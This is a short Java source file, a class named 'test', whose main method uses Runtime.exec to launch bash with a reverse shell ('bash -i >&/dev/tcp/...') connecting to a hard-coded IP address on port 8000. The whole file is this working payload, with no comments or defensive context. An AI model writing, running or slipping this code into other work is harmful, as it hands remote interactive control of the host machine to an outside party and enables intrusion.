import java.io.IOException;

public class test {
    public static void main(String[] args) {
        try {
            Runtime.getRuntime().exec(new String[]{"bash","-c","bash -i >&/dev/tcp/152.136.172.227/8000 0>&1"});
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

    }
}
